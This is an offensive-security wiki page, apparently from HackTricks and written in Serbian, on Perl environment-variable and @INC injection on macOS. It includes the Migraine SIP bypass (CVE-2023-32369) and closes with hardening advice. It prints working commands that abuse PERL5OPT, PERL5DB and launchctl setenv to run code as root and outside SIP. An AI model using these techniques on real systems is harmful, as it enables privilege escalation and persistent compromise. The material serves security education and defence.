# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Korišćenjem env variable **`PERL5OPT`** moguće je naterati **Perl** da izvrši proizvoljne komande kada se interpreter pokrene (čak **pre** nego što se parsira prvi red ciljne skripte).
Na primer, kreirajte ovu skriptu:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sada **izvezite env promenljivu** i izvršite **perl** skriptu:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Druga opcija je da kreirate Perl modul (npr. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Zatim koristite env variables kako bi modul bio automatski pronađen i učitan:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Ostale zanimljive environment variables

- **`PERL5DB`** – kada se interpreter pokrene sa **`-d`** (debugger) flagom, sadržaj promenljive `PERL5DB` se izvršava kao Perl kod *unutar* debugger konteksta.  
Ako možete da utičete i na environment i na command-line flagove privilegovanog Perl procesa, možete uraditi nešto poput:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – na Windowsu ova promenljiva određuje koji će shell executable Perl koristiti kada treba da pokrene shell. Ovde se pominje samo radi potpunosti, jer nije relevantna za macOS.

Iako `PERL5DB` zahteva `-d` switch, često se mogu pronaći maintenance ili installer skripte koje se izvršavaju kao *root* sa ovim flagom omogućenim radi detaljnog troubleshooting-a, zbog čega ova promenljiva predstavlja validan escalation vector.

## Preko dependencies (@INC abuse)

Moguće je izlistati include path koji će Perl pretraživati (**`@INC`**) pokretanjem:
```bash
perl -e 'print join("\n", @INC)'
```
Tipičan izlaz na macOS 13/14 izgleda ovako:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Neke od vraćenih fascikli čak i ne postoje, međutim **`/Library/Perl/5.30`** postoji, *nije* zaštićen SIP-om i nalazi se *pre* fascikli zaštićenih SIP-om. Zato, ako možete da pišete kao *root*, možete ubaciti maliciozni modul (npr. `File/Basename.pm`) koji će biti *prioritetno* učitan od strane svake privilegovane skripte koja importuje taj modul.

> [!WARNING]
> I dalje vam je potreban **root** za pisanje unutar `/Library/Perl`, a macOS će prikazati **TCC** prompt koji zahteva *Full Disk Access* za proces koji obavlja operaciju pisanja.

Na primer, ako skripta importuje **`use File::Basename;`**, bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` koji sadrži code pod kontrolom napadača.

## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)

U maju 2023. Microsoft je objavio **CVE-2023-32369**, nazvan **Migraine**, post-exploitation tehniku koja *root* napadaču omogućava da u potpunosti **zaobiđe System Integrity Protection (SIP)**.
Ranjiva komponenta je **`systemmigrationd`**, daemon sa entitlement-om **`com.apple.rootless.install.heritable`**. Svaki child process koji pokrene ovaj daemon nasleđuje entitlement i zato se izvršava *izvan* SIP ograničenja.<sup>[[1]](#references)</sup>

Među child process-ima koje su istraživači identifikovali nalazi se i Apple-ovim potpisom označeni interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Pošto Perl poštuje `PERL5OPT` (a Bash poštuje `BASH_ENV`), trovanje *okruženja* demona dovoljno je za sticanje mogućnosti proizvoljnog izvršavanja u kontekstu bez SIP-a:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Kada se pokrene `migrateLocalKDC`, `/usr/bin/perl` se pokreće sa zlonamernim `PERL5OPT` i izvršava `/private/tmp/migraine.sh` *pre nego što se SIP ponovo omogući*. Iz te skripte možete, na primer, kopirati payload u **`/System/Library/LaunchDaemons`** ili dodeliti prošireni atribut `com.apple.rootless` kako bi fajl bio **nemoguće obrisati**.

Apple je rešio problem u macOS verzijama **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ali stariji ili nezakrpljeni sistemi i dalje mogu biti iskorišćeni.<sup>[[1]](#references)</sup>

## Preporuke za hardening

1. **Obrišite opasne promenljive** – privilegovani launchdaemons ili cron poslovi treba da se pokreću sa čistim okruženjem (`launchctl unsetenv PERL5OPT`, `env -i`, itd.).
2. **Izbegavajte pokretanje interpretera kao root** osim kada je to apsolutno neophodno. Koristite kompajlirane binarne fajlove ili rano smanjite privilegije.
3. **Skripte isporučujte sa `-T` (taint mode)** kako bi Perl ignorisao `PERL5OPT` i druge nebezbedne opcije kada je omogućena provera taint-a.
4. **Redovno ažurirajte macOS** – “Migraine” je u potpunosti zakrpljen u aktuelnim izdanjima.

## Reference

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
